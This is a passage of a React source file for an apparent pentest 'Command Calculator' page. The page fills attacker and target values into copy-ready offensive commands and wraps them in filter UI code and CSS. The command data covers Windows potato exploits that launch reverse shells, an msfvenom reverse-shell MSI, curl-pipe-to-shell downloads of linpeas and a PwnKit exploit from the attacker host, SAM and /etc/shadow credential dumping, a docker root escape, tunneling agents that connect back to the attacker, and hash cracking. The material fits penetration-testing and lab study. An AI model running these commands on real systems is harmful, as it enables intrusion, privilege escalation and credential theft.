          { label: "PrintSpoofer", cmd: `.\\PrintSpoofer64.exe -i -c cmd`, note: "First choice on 2016/2019 with SeImpersonate." },
          { label: "GodPotato (.NET 3.5+/4)", cmd: `.\\GodPotato-NET4.exe -cmd "cmd /c whoami"`, note: "Most reliable on modern Server. Swap -NET2 if 4 fails." },
          { label: "GodPotato → reverse shell", cmd: `.\\GodPotato-NET4.exe -cmd "cmd /c C:\\Windows\\Temp\\rev.exe"` },
          { label: "JuicyPotatoNG", cmd: `.\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\Temp\\rev.exe"` },
          { label: "RoguePotato (older)", cmd: `.\\RoguePotato.exe -r ${LHOST} -e "C:\\Windows\\Temp\\rev.exe" -l 9999` },
        ]},
        { phase: "Credential / hash theft", cmds: [
          { label: "SeBackup — dump SAM+SYSTEM", cmd: `reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive`, note: "Then offline: impacket-secretsdump -sam sam.hive -system system.hive LOCAL" },
          { label: "Saved creds (cmdkey)", cmd: `cmdkey /list`, note: "If creds stored: runas /savecred /user:DOMAIN\\admin cmd" },
          { label: "Registry autologon", cmd: `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword` },
          { label: "Search files for passwords", cmd: `findstr /si password *.txt *.ini *.config *.xml 2>nul` },
        ]},
        { phase: "AlwaysInstallElevated", cmds: [
          { label: "Check both keys", cmd: `reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`, note: "Both = 0x1 → any .msi runs as SYSTEM." },
          { label: "Build + run malicious MSI", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f msi -o evil.msi\nmsiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi` },
        ]},
      ],
    },
    linpriv: {
      name: "Linux Privesc", groups: [
        { phase: "Triage", cmds: [
          { label: "sudo rights", cmd: `sudo -l`, note: "Anything here → check GTFOBins for the binary." },
          { label: "SUID binaries", cmd: `find / -perm -4000 -type f 2>/dev/null`, note: "Cross-ref each against GTFOBins 'SUID' section." },
          { label: "Capabilities", cmd: `getcap -r / 2>/dev/null`, note: "cap_setuid on python/perl = instant root." },
          { label: "linpeas", cmd: `curl http://${LHOST}/linpeas.sh | sh`, note: "Or wget to /tmp, chmod +x, run with 'sh'." },
          { label: "Writable cron / pspy", cmd: `cat /etc/crontab\nls -la /etc/cron.*\n./pspy64`, note: "pspy shows root cron jobs with no log access needed." },
        ]},
        { phase: "GTFOBins escalation", cmds: [
          { label: "sudo with NOPASSWD binary", cmd: `sudo BINARY`, note: "Look BINARY up on GTFOBins → copy the 'Sudo' payload (e.g. find: sudo find . -exec /bin/sh \\; -quit)." },
          { label: "SUID shell drop", cmd: `BINARY -p`, note: "For SUID bash/dash use -p to preserve euid." },
          { label: "Writable /etc/passwd", cmd: `openssl passwd -1 -salt x pass123\n# add: root2:<hash>:0:0:root:/root:/bin/bash  → su root2` },
        ]},
        { phase: "Kernel / known exploits", cmds: [
          { label: "Kernel + distro", cmd: `uname -a\ncat /etc/os-release` },
          { label: "Pkexec (CVE-2021-4034)", cmd: `curl http://${LHOST}/pwnkit -o /tmp/pk && chmod +x /tmp/pk && /tmp/pk`, note: "PwnKit — works on most unpatched 2021-era boxes." },
          { label: "Sudo Baron Samedit (CVE-2021-3156)", cmd: `sudoedit -s '\\' $(python3 -c 'print("A"*1000)')`, note: "Vuln if it segfaults. Use a compiled exploit to actually escalate." },
        ]},
        { phase: "Loot & creds", cmds: [
          { label: "SSH keys / history", cmd: `find / -name id_rsa 2>/dev/null\ncat ~/.bash_history` },
          { label: "Password hunt", cmd: `grep -riE 'password|passwd|secret' /etc /var/www /home 2>/dev/null | head` },
          { label: "Mounted / interesting", cmd: `cat /etc/fstab\nmount` },
        ]},
        { phase: "Group & misconfig escalations", cmds: [
          { label: "In docker / lxd group?", cmd: `id\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh`, note: "docker group = instant root via host mount. lxd: import alpine, mount / with security.privileged." },
          { label: "Readable /etc/shadow", cmd: `ls -l /etc/shadow\ncat /etc/shadow 2>/dev/null`, note: "If readable: unshadow + john, or crack root's hash (-m 1800 sha512crypt)." },
          { label: "NFS no_root_squash", cmd: `cat /etc/exports\nshowmount -e ${IP}`, note: "no_root_squash → mount the share from Kali as root, drop a SUID binary." },
          { label: "sudo LD_PRELOAD / LD_LIBRARY_PATH", cmd: `sudo -l`, note: "If env_keep+=LD_PRELOAD: compile a .so with an init() that sets uid 0, run sudo BINARY with LD_PRELOAD=./x.so." },
          { label: "linux-exploit-suggester", cmd: `curl http://${LHOST}/les.sh | bash`, note: "Maps kernel + pkgs to known local-root CVEs. Cross-check before firing kernel exploits." },
        ]},
      ],
    },
    tunnel: {
      name: "Tunneling / Pivot", groups: [
        { phase: "ligolo-ng (preferred)", cmds: [
          { label: "Kali — interface + listener", cmd: `sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert`, note: "Run once. In the ligolo console you'll get the agent session." },
          { label: "Agent (on target)", cmd: `.\\agent.exe -connect ${LHOST}:11601 -ignore-cert`, note: "Linux target: ./agent -connect …" },
          { label: "Route the internal subnet", cmd: `# in ligolo console: session → start\nsudo ip route add 10.10.20.0/24 dev ligolo`, note: "Now Kali tools hit the second-hop subnet directly." },
        ]},
        { phase: "chisel (SOCKS)", cmds: [
          { label: "Kali — server", cmd: `./chisel server -p 8000 --reverse` },
          { label: "Target — reverse SOCKS", cmd: `.\\chisel.exe client ${LHOST}:8000 R:socks`, note: "Then add 'socks5 127.0.0.1 1080' to /etc/proxychains4.conf." },
          { label: "Use it", cmd: `proxychains nxc smb 10.10.20.10 ${nxcA()}` },
        ]},
        { phase: "SSH port-forwarding", cmds: [
          { label: "Local forward (reach internal svc)", cmd: `ssh -L 8080:10.10.20.10:80 ${U}@${IP}`, note: "Kali:8080 → internal host:80 through the foothold." },
          { label: "Dynamic SOCKS", cmd: `ssh -D 1080 ${U}@${IP}`, note: "proxychains everything over 1080." },
          { label: "Remote forward (expose Kali svc)", cmd: `ssh -R 8000:127.0.0.1:8000 ${U}@${IP}` },
        ]},
        { phase: "sshuttle (quick VPN-like)", cmds: [
          { label: "Route a subnet through SSH", cmd: `sshuttle -r ${U}@${IP} 10.10.20.0/24`, note: "Transparent — no proxychains needed. Target needs python." },
        ]},
      ],
    },
    cracking: {
      name: "Hash Cracking", groups: [
        { phase: "hashcat modes", cmds: [
          { label: "NTLM (-m 1000)", cmd: `hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt` },
          { label: "Kerberoast TGS (-m 13100)", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt` },
          { label: "AS-REP (-m 18200)", cmd: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt` },
          { label: "NetNTLMv2 (-m 5600)", cmd: `hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt` },
          { label: "NetNTLMv1 (-m 5500)", cmd: `hashcat -m 5500 netntlmv1.txt /usr/share/wordlists/rockyou.txt`, note: "v1 is downgradeable to crack offline / relay to krbtgt." },
          { label: "Domain Cached Creds 2 (-m 2100)", cmd: `hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt`, note: "$DCC2$ hashes from a domain-joined host's registry — slow, low iter count helps." },
          { label: "NTLMv2 + best64 rules", cmd: `hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, note: "When straight rockyou misses, rules are the next move before bigger lists." },
        ]},
        { phase: "Manage & fallback", cmds: [
          { label: "Show cracked (from potfile)", cmd: `hashcat -m 13100 tgs.txt --show` },
          { label: "john fallback (auto-detect)", cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\njohn --show hashes.txt` },
          { label: "Identify an unknown hash", cmd: `nth --text 'HASH'   # name-that-hash`, note: "Tells you the hashcat -m mode to use." },
        ]},
      ],
    },
  }), [authMode, varMode, Q, f, baseDN, NB, SUBNET, hostsLine, IP, DCIP, HOST, D, U, SEC, LHOST, LPORT, TH, ldapAuth, winrmAuth]);

  // ── global filter across every service ──────────────────
  const q = filter.trim().toLowerCase();
  // tokenized AND match — every whitespace-separated term must appear
  const tokens = q ? q.split(/\s+/).filter(Boolean) : [];
  const matchAll = (text) => {
    const t = (text || "").toLowerCase();
    return tokens.every((term) => t.includes(term));
  };
  const filtered = useMemo(() => {
    if (!tokens.length) return null;
    const out = [];
    for (const [id, svc] of Object.entries(services)) {
      const cmds = [];
      for (const g of svc.groups)
        for (const c of g.cmds)
          if (matchAll(c.label) || matchAll(c.cmd))
            cmds.push({ ...c, phase: g.phase });
      if (cmds.length) out.push({ id, name: svc.name, cmds });
    }
    return out;
  }, [q, services]);

  // ── All Path: every node, with your vars substituted in ──
  // Replace The Path's placeholder conventions. Order matters: longer/more
  // specific tokens first so $dcip isn't eaten by $ip, etc. Sequential
  // .replace() calls mean each token is gone before the next runs.
  const subPath = (text) => (text || "")
    .replace(/\$dc_ip\b/gi, DCIP)
    .replace(/\$dcip\b/gi, DCIP)
    .replace(/\$target_ip\b/gi, IP)
    .replace(/\$rhost\b/gi, IP)
    .replace(/\$kali_ip\b/gi, LHOST)
    .replace(/\bKALI_IP\b/g, LHOST)
    .replace(/\bTARGET_IP\b/g, IP)
    .replace(/\$lhost\b/gi, LHOST)
    .replace(/\$lport\b/gi, LPORT)
    .replace(/\$subnet\b/gi, SUBNET)
    .replace(/\$range\b/gi, SUBNET)
    .replace(/\$domain\b/gi, D)
    .replace(/\$target\b/gi, IP)
    .replace(/\$user\b/gi, U)
    .replace(/\$pass\b/gi, SEC)
    .replace(/\$ip\b/gi, IP);

  // boil a node's cmd down to its runnable form: drop # comments, ═ banners,
  // inline annotations, and blank lines. What's left is what you actually type.
  // Backslash line-continuations are joined first so multi-line commands stay whole.
  const boil = (cmd) => {
    const joined = (cmd || "").replace(/\\\n\s*/g, " "); // merge `\`-continued lines
    return joined
      .split("\n")
      .map((l) => l.replace(/\s+$/, ""))
      .filter((l) => l.trim() && !l.trim().startsWith("#"));
  };

  const phaseMeta = (p) => ({
    color: (PHASES[p] || {}).color || "#7fb3ff",
    icon: (PHASES[p] || {}).icon || "▪",
  });
  const phaseOrder = Object.keys(PHASES);
  const orderPhases = (keys) => [
    ...phaseOrder.filter((p) => keys.includes(p)),
    ...keys.filter((p) => !phaseOrder.includes(p)),
  ];

  // boiled command blocks, one per node, grouped by phase (prose-only nodes drop out)
  const allPath = useMemo(() => {
    const groups = {};
    for (const [id, n] of Object.entries(nodes)) {
      const lines = boil(n.cmd);
      if (!lines.length) continue;
      const ph = n.phase || "OTHER";
      (groups[ph] = groups[ph] || []).push({ id, title: n.title || id, lines });
    }
    return orderPhases(Object.keys(groups)).map((p) => ({
      phase: p, ...phaseMeta(p), nodes: groups[p],
    }));
  }, [phaseOrder]);

  const allNodeCount = useMemo(
    () => allPath.reduce((n, g) => n + g.nodes.length, 0), [allPath]
  );
  const allLineCount = useMemo(
    () => allPath.reduce((n, g) => n + g.nodes.reduce((m, nd) => m + nd.lines.length, 0), 0),
    [allPath]
  );

  // when searching, drop to LINE level: grep every runnable line across all nodes,
  // dedupe identical commands, group by phase. This is the "find the one line" mode.
  const allFiltered = useMemo(() => {
    if (mode !== "all") return null;
    if (!tokens.length) return { kind: "blocks", groups: allPath };
    const seen = new Set();
    const byPhase = {};
    for (const g of allPath) {
      for (const nd of g.nodes) {
        for (const line of nd.lines) {
          if (!matchAll(line) && !matchAll(nd.title)) continue;
          const key = line.trim();
          if (seen.has(key)) continue;
          seen.add(key);
          (byPhase[g.phase] = byPhase[g.phase] || []).push({ line, src: nd.title });
        }
      }
    }
    const groups = orderPhases(Object.keys(byPhase)).map((p) => ({
      phase: p, ...phaseMeta(p), lines: byPhase[p],
    }));
    return { kind: "lines", groups };
  }, [mode, q, allPath]);

  const svc = services[active];

  return (
    <div className="cc">
      <style>{css}</style>

      <header className="cc-hdr">
        <a href="/" className="cc-back">← The Path</a>
        <h1 className="cc-title">Command Calculator</h1>
        <p className="cc-sub">Fill the bar once · every command rewrites live · click to copy</p>
      </header>

      {/* VARIABLE BAR */}
      <div className="varbar">
        {/* host profile tabs */}
        <div className="host-row">
          <span className="host-lbl">Hosts</span>
          <div className="host-tabs">
            {hosts.map((h) => (
              <div key={h.id} className={`host-tab${h.id === host.id ? " on" : ""}`}>
                <button className="host-radio" onClick={() => setActiveId(h.id)} title="Make active">
                  <span className={`dot${h.id === host.id ? " on" : ""}`} />
                </button>
                {renaming === h.id ? (
                  <input
                    className="host-rename"
                    defaultValue={h.name}
                    autoFocus
                    onBlur={(e) => { rename(h.id, e.target.value.trim()); setRenaming(null); }}
                    onKeyDown={(e) => { if (e.key === "Enter") e.target.blur(); }}
                  />
                ) : (
                  <span className="host-name" onClick={() => setActiveId(h.id)} onDoubleClick={() => setRenaming(h.id)} title="Double-click to rename">
                    {h.name}
                  </span>
                )}
                {hosts.length > 1 && (
                  <button className="host-x" onClick={() => delHost(h.id)} title="Delete host">×</button>
                )}
              </div>
            ))}
            <button className="host-add" onClick={addHost} title="Add host">+ host</button>
          </div>
          <button className="clear-all" onClick={clearAll} title="Wipe all saved data">clear all</button>
        </div>

        <div className="var-grid">
          {FIELDS.map(({ k, label, ph }) => {
            const setq = !!f[k];
            return (
              <div key={k} className="var">
                <label>
                  <span className={`fdot${setq ? " set" : ""}`} />
                  {label}
                </label>
                <input
                  value={f[k]}
                  onChange={set(k)}
                  placeholder={ph}
                  type="text"
                  spellCheck={false}
                  autoComplete="off"
                />
              </div>
            );
          })}
        </div>

        <div className="auth-row">
          <span className="auth-lbl">Auth</span>
          <div className="auth-toggle">
            {AUTH.map((a) => (
              <button key={a.id} className={`auth-btn${authMode === a.id ? " on" : ""}`} onClick={() => setAuthMode(a.id)}>
                {a.label}
              </button>
            ))}
          </div>
          <span className="auth-lbl">Output</span>
          <div className="auth-toggle">
            <button className={`auth-btn${varMode === "literal" ? " on" : ""}`} onClick={() => setVarMode("literal")} title="Substitute real values">literal</button>
            <button className={`auth-btn${varMode === "vars" ? " on" : ""}`} onClick={() => setVarMode("vars")} title="Keep $shell variables">$ vars</button>
          </div>
          <span className={`ready${unfilled.length ? "" : " ok"}`}>
            {unfilled.length ? `${unfilled.length} unset` : "✓ ready"}
          </span>
          <div className="derived">
            <Chip label="base DN" value={baseDN} />
            <Chip label="NETBIOS" value={NB} />
            <Chip label="/etc/hosts" value={hostsLine.replace("\t", "  ")} />
          </div>
        </div>

        {V && exportBlock && (
          <div className="export-banner">
            <div className="export-lbl">Run once to seed your shell, then every command below uses the variables:</div>
            <CmdCard label="export" cmd={exportBlock} />
          </div>
        )}

        {authMode === "krb" && (
          <div className="krb-banner">
            Kerberos mode — commands now target <b>{HOST}</b>, not the IP. Make sure the host is in
            <code> /etc/hosts</code> and you've run <code>export KRB5CCNAME=ticket.ccache</code>.
          </div>
        )}
      </div>

      {/* MODE TOGGLE */}
      <div className="mode-row">
        <div className="mode-toggle">
          <button className={`mode-btn${mode === "curated" ? " on" : ""}`} onClick={() => setMode("curated")}>
            Curated
          </button>
          <button className={`mode-btn${mode === "all" ? " on" : ""}`} onClick={() => setMode("all")}>
            All Path · {allLineCount}
          </button>
        </div>
        <span className="mode-hint">
          {mode === "all"
            ? `${allNodeCount} nodes, commands only — type to grep every line`
            : "Hand-tuned commands with the auth toggle."}
        </span>
      </div>

      {/* FILTER */}
      <div className="filter-wrap">
        <input
          className="filter"
          value={filter}
          onChange={(e) => setFilter(e.target.value)}
          placeholder={mode === "all" ? "grep every Path command — space = AND (e.g. impacket hashes)" : "Filter every binary — psexec, kerberoast, snmpwalk…"}
          spellCheck={false}
        />
        {filter && <button className="filter-clear" onClick={() => setFilter("")}>clear</button>}
      </div>

      {/* CONTENT */}
      {mode === "all" ? (
        <div className="results">
          {allFiltered.groups.length === 0 ? (
            <div className="empty">No Path command matches “{filter}”.</div>
          ) : allFiltered.kind === "lines" ? (
            // line-level grep: one matching command per row, deduped, with source tag
            allFiltered.groups.map((g) => (
              <section key={g.phase} className="svc-block">
                <h2 className="svc-name" style={{ color: g.color }}>
                  <span style={{ marginRight: ".4rem" }}>{g.icon}</span>{g.phase}
                  <span className="phase-count">{g.lines.length}</span>
                </h2>
                <div className="cmd-list">
                  {g.lines.map((ln, i) => (
                    <CmdLine key={i} cmd={subPath(ln.line)} src={ln.src} />
                  ))}
                </div>
              </section>
            ))
          ) : (
            // browse: boiled command block per node, grouped by phase
            allFiltered.groups.map((g) => (
              <section key={g.phase} className="svc-block">
                <h2 className="svc-name" style={{ color: g.color }}>
                  <span style={{ marginRight: ".4rem" }}>{g.icon}</span>{g.phase}
                  <span className="phase-count">{g.nodes.length}</span>
                </h2>
                <div className="cmd-list">
                  {g.nodes.map((n) => (
                    <CmdCard key={n.id} label={n.title} cmd={subPath(n.lines.join("\n"))} />
                  ))}
                </div>
              </section>
            ))
          )}
        </div>
      ) : filtered ? (
        <div className="results">
          {filtered.length === 0 ? (
            <div className="empty">No command matches “{filter}”. Try a binary name or flag.</div>
          ) : (
            filtered.map((s) => (
              <section key={s.id} className="svc-block">
                <h2 className="svc-name">{s.name}</h2>
                <div className="cmd-list">
                  {s.cmds.map((c, i) => <CmdCard key={i} {...c} />)}
                </div>
              </section>
            ))
          )}
        </div>
      ) : (
        <>
          <nav className="tabs">
            {Object.entries(services).map(([id, s]) => (
              <button
                key={id}
                className={`tab${active === id ? " on" : ""}`}
                onClick={() => setActive(id)}
              >
                {s.name}
              </button>
            ))}
          </nav>
          <div className="results">
            {svc.groups.map((g, gi) => (
              <section key={gi} className="svc-block">
                <h2 className="svc-name">{g.phase}</h2>
                <div className="cmd-list">
                  {g.cmds.map((c, i) => <CmdCard key={i} {...c} />)}
                </div>
              </section>
            ))}
          </div>
        </>
      )}
    </div>
  );
}

const css = `
  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=JetBrains+Mono:wght@400;500;700&display=swap');
  .cc *{box-sizing:border-box;margin:0;padding:0}
  .cc{
    --bg:#0b0f14; --panel:#11161d; --panel2:#0d1219; --line:#1d2630;
    --ink:#c4d0dc; --dim:#5f7184; --amber:#f5a623; --amber-soft:#f5a62322;
    --accent:#7fb3ff; --ok:#6ee7a8;
    min-height:100vh; background:var(--bg); color:var(--ink);
    font-family:'JetBrains Mono',ui-monospace,monospace; padding:1.5rem 1rem 4rem;
  }
  .cc-hdr{max-width:1080px;margin:0 auto 1.1rem}
  .cc-back{color:var(--dim);font-size:.72rem;text-decoration:none}
  .cc-back:hover{color:var(--amber)}
  .cc-title{font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1.7rem;letter-spacing:-.01em;margin-top:.35rem;color:#eaf1f8}
  .cc-sub{font-size:.7rem;color:var(--dim);margin-top:.15rem;letter-spacing:.02em}

  .mode-row{max-width:1080px;margin:0 auto .8rem;display:flex;align-items:center;gap:.7rem;flex-wrap:wrap}
  .mode-toggle{display:inline-flex;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:2px}
  .mode-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:.7rem;padding:.4rem .9rem;border-radius:6px;cursor:pointer;transition:all .12s}
  .mode-btn:hover{color:var(--ink)}
  .mode-btn.on{background:var(--accent);color:#06101e;font-weight:700}
  .mode-hint{font-size:.62rem;color:var(--dim)}
  .phase-count{margin-left:.5rem;font-size:.6rem;color:var(--dim);font-weight:400;letter-spacing:0}
  .node{display:flex;flex-direction:column;gap:.3rem;padding:.2rem 0}
  .node-title{font-size:.72rem;color:#cdd9e6;font-weight:500}
  .node-body{font-size:.64rem;color:var(--dim);line-height:1.5}

  .cmdline{display:flex;align-items:center;gap:.6rem;background:var(--panel2);border:1px solid var(--line);
    border-radius:6px;padding:.4rem .6rem;cursor:pointer;transition:border-color .12s}
  .cmdline:hover{border-color:#2b3a49}
  .cmdline:active{transform:translateY(1px)}
  .cmdline-text{flex:1;font-size:.7rem;line-height:1.5;color:#aac4e0;white-space:pre-wrap;word-break:break-all;margin:0}
  .cmdline-text .tok{color:var(--amber);background:var(--amber-soft);border-radius:3px;padding:0 .15rem;font-weight:500}
  .cmdline-src{flex-shrink:0;font-size:.54rem;color:var(--dim);max-width:32%;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-align:right}

  .varbar{position:sticky;top:0;z-index:20;max-width:1080px;margin:0 auto 1rem;
    background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:.9rem;
    box-shadow:0 8px 30px -12px #000a}

  .host-row{display:flex;align-items:center;gap:.6rem;flex-wrap:wrap;margin-bottom:.85rem;
    padding-bottom:.8rem;border-bottom:1px solid var(--line)}
  .host-lbl{font-size:.56rem;text-transform:uppercase;letter-spacing:.12em;color:var(--dim)}
  .host-tabs{display:flex;gap:.4rem;flex-wrap:wrap;flex:1}
  .host-tab{display:flex;align-items:center;gap:.35rem;background:var(--panel2);border:1px solid var(--line);
    border-radius:7px;padding:.25rem .45rem;transition:border-color .12s}
  .host-tab.on{border-color:var(--accent)}
  .host-radio{background:none;border:none;padding:0;cursor:pointer;display:flex;align-items:center}
  .host-radio .dot{width:9px;height:9px;border-radius:50%;border:2px solid var(--dim);box-sizing:border-box}
  .host-radio .dot.on{border-color:var(--accent);background:var(--accent)}
  .host-name{font-size:.7rem;color:var(--ink);cursor:pointer;user-select:none}
  .host-tab.on .host-name{color:var(--accent)}
  .host-rename{background:#0a0e13;border:1px solid var(--accent);border-radius:4px;color:var(--ink);
    font-family:inherit;font-size:.7rem;width:90px;padding:.1rem .3rem;outline:none}
  .host-x{background:none;border:none;color:var(--dim);cursor:pointer;font-size:.85rem;line-height:1;padding:0 .1rem}
  .host-x:hover{color:#ff6b6b}
  .host-add{background:none;border:1px dashed var(--line);color:var(--dim);border-radius:7px;
    padding:.25rem .55rem;font-family:inherit;font-size:.66rem;cursor:pointer}
  .host-add:hover{color:var(--ink);border-color:var(--dim)}
  .clear-all{background:none;border:none;color:#5a4a4a;font-family:inherit;font-size:.58rem;cursor:pointer;margin-left:auto}
  .clear-all:hover{color:#ff6b6b}

  .var-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.55rem}
  .var{display:flex;flex-direction:column;gap:.22rem}
  .var label{display:flex;align-items:center;gap:.3rem;font-size:.54rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .fdot{width:6px;height:6px;border-radius:50%;background:#33414f;flex-shrink:0;transition:background .12s}
  .fdot.set{background:var(--ok)}
  .var input{background:var(--panel2);border:1px solid var(--line);border-radius:6px;
    padding:.42rem .55rem;color:var(--ink);font-family:inherit;font-size:.74rem;outline:none;transition:border-color .12s}
  .var input:focus{border-color:var(--amber)}
  .var input::placeholder{color:#33414f}

  .ready{font-size:.6rem;padding:.2rem .5rem;border-radius:5px;background:#2a1f1f;color:#d99;letter-spacing:.04em}
  .ready.ok{background:#15281c;color:var(--ok)}
  .export-banner{margin-top:.8rem;padding-top:.8rem;border-top:1px solid var(--line)}
  .export-lbl{font-size:.6rem;color:var(--accent);margin-bottom:.4rem}

  .auth-row{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;margin-top:.85rem;
    padding-top:.8rem;border-top:1px solid var(--line)}
  .auth-lbl{font-size:.56rem;text-transform:uppercase;letter-spacing:.12em;color:var(--dim)}
  .auth-toggle{display:inline-flex;background:var(--panel2);border:1px solid var(--line);border-radius:7px;padding:2px}
  .auth-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:.68rem;
    padding:.34rem .8rem;border-radius:5px;cursor:pointer;transition:all .12s}
  .auth-btn:hover{color:var(--ink)}
  .auth-btn.on{background:var(--amber);color:#1a1206;font-weight:700}
  .derived{display:flex;gap:.4rem;flex-wrap:wrap;margin-left:auto}
  .chip{display:flex;flex-direction:column;gap:1px;background:var(--panel2);border:1px solid var(--line);
    border-radius:6px;padding:.3rem .55rem;cursor:pointer;transition:border-color .12s;max-width:260px}
  .chip:hover{border-color:var(--accent)}
  .chip-label{font-size:.5rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .chip-val{font-size:.66rem;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

  .krb-banner{margin-top:.75rem;background:var(--amber-soft);border:1px solid #f5a62355;border-radius:7px;
    padding:.5rem .7rem;font-size:.66rem;line-height:1.5;color:#f0c987}
  .krb-banner code{background:#0006;padding:.04rem .3rem;border-radius:3px;color:#ffd98a}
  .krb-banner b{color:#ffd98a}

  .filter-wrap{max-width:1080px;margin:0 auto 1rem;display:flex;gap:.5rem;align-items:center}
  .filter{flex:1;background:var(--panel);border:1px solid var(--line);border-radius:8px;
    padding:.55rem .75rem;color:var(--ink);font-family:inherit;font-size:.74rem;outline:none;transition:border-color .12s}
  .filter:focus{border-color:var(--amber)}
  .filter::placeholder{color:#3a4856}
  .filter-clear{background:none;border:1px solid var(--line);color:var(--dim);border-radius:6px;
    padding:.5rem .7rem;font-family:inherit;font-size:.66rem;cursor:pointer}
  .filter-clear:hover{color:var(--ink);border-color:var(--dim)}

  .tabs{max-width:1080px;margin:0 auto .9rem;display:flex;gap:.3rem;flex-wrap:wrap}
  .tab{background:var(--panel);border:1px solid var(--line);color:var(--dim);border-radius:6px;
    padding:.34rem .7rem;font-family:inherit;font-size:.66rem;cursor:pointer;transition:all .12s}
  .tab:hover{color:var(--ink);border-color:var(--dim)}
  .tab.on{color:var(--amber);border-color:var(--amber);background:#1c150622}

  .results{max-width:1080px;margin:0 auto;display:flex;flex-direction:column;gap:1.3rem}
  .svc-block{display:flex;flex-direction:column;gap:.55rem}
  .svc-name{font-family:'Space Grotesk',sans-serif;font-size:.78rem;font-weight:700;color:#9fb4c8;
    text-transform:uppercase;letter-spacing:.12em;padding-bottom:.4rem;border-bottom:1px solid var(--line)}
  .cmd-list{display:grid;grid-template-columns:1fr;gap:.5rem}

  .cmd{background:var(--panel2);border:1px solid var(--line);border-radius:8px;overflow:hidden;
    cursor:pointer;transition:border-color .12s,transform .08s}
  .cmd:hover{border-color:#2b3a49}
  .cmd:active{transform:translateY(1px)}
  .cmd-head{display:flex;justify-content:space-between;align-items:center;
    padding:.4rem .65rem;background:#0a0e13;border-bottom:1px solid var(--line)}
  .cmd-label{font-size:.64rem;color:var(--accent);letter-spacing:.02em}
  .cmd-copy{font-size:.56rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .cmd-copy.ok{color:var(--ok)}
  .cmd-text{padding:.6rem .65rem;font-size:.7rem;line-height:1.7;color:#aac4e0;
    white-space:pre-wrap;word-break:break-all}
  .cmd-text .tok{color:var(--amber);background:var(--amber-soft);border-radius:3px;padding:0 .15rem;font-weight:500}
  .cmd-text .var,.cmdline-text .var{color:var(--accent);font-weight:500}
  .cmd-note{padding:.4rem .65rem;border-top:1px solid var(--line);font-size:.6rem;color:var(--dim);line-height:1.5}

  .empty{text-align:center;padding:2.5rem;color:var(--dim);font-size:.74rem}

  @media (max-width:560px){
    .derived{margin-left:0;width:100%}
    .cmd-text{word-break:break-all}
  }
`;
